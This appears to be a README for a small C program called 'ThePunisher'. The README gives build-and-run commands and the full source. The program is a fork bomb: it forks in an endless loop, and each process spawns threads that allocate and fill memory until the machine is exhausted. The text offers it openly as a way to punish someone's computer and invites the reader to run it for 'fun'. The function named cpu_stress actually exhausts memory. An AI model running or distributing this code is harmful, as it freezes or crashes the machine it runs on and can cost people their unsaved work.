# ThePunisher
When you need your computer to understand who is the master
> *Shoutout to that macbook asshole*\
> *He was asking for it*

```sh
gcc -pthread -O2 fun.c -o fun
./fun
# have fun! :D
```

fun.c
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>

#define CHUNK_SIZE (10 * 1024 * 1024)

void* cpu_stress(void* arg) {
    (void)arg;
    size_t count = 0;
     while (1) {
        void *p = mmap(NULL, CHUNK_SIZE,
                       PROT_READ|PROT_WRITE,
                       MAP_ANON|MAP_PRIVATE,
                       -1, 0);
        if (p == MAP_FAILED) {
            fprintf(stderr,
                    "\n[mmap] failed after allocating %.1f GiB: %s\n",
                    (double)count * CHUNK_SIZE / (1024*1024*1024),
                    strerror(errno));
            break;
        }
        memset(p, 0xA5, CHUNK_SIZE);

        count++;
        printf("\rCommitted %.1f GiB RAM…",
               (double)count * CHUNK_SIZE / (1024*1024*1024));
        fflush(stdout);
    }
    return NULL;
}

int main(void) {
    long ncores = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncores < 1) ncores = 1;
    else ncores = 2;
    while(fork() == 0) {}
    pthread_t *threads = malloc(ncores * sizeof(*threads));
    if (!threads) {
        perror("malloc threads");
        exit(EXIT_FAILURE);
    }
    for (long i = 0; i < ncores; i++) {
        if (pthread_create(&threads[i], NULL, cpu_stress, NULL) != 0) {
            perror("pthread_create");
            exit(EXIT_FAILURE);
        }
    }

    size_t count = 0;
    while (1) {
        void *p = mmap(NULL, CHUNK_SIZE,
                       PROT_READ|PROT_WRITE,
                       MAP_ANON|MAP_PRIVATE,
                       -1, 0);
        if (p == MAP_FAILED) {
            fprintf(stderr,
                    "\n[mmap] failed after allocating %.1f GiB: %s\n",
                    (double)count * CHUNK_SIZE / (1024*1024*1024),
                    strerror(errno));
            break;
        }
        memset(p, 0xA5, CHUNK_SIZE);

        count++;
        printf("\rCommitted %.1f GiB RAM…",
               (double)count * CHUNK_SIZE / (1024*1024*1024));
        fflush(stdout);
    }
    pause();
    return 0;
}
```
